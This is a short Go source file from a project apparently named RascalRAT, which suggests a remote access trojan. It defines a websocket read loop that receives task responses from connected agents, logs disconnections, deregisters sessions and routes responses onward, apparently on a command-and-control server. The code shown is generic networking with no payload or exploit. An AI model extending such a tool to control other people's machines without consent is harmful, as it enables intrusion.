package ws

import (
	"log/slog"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
	"github.com/its-ernest/RascalRAT/internal/protocol"
)

func (s *AgentSession) readPump(hub *Hub) {
	defer hub.Deregister(s.ID)

	for {
		var response protocol.TaskResponse
		if err := wsjson.Read(s.ctx, s.Conn, &response); err != nil {
			status := websocket.CloseStatus(err)
			if status == websocket.StatusNormalClosure || status == websocket.StatusGoingAway {
				slog.Info("agent websocket closed", "node_id", s.ID, "close_status", status)
			} else {
				slog.Error("agent websocket read failure", "node_id", s.ID, "err", err, "close_status", status)
			}
			return
		}

		s.RouteResponse(response)
	}
}
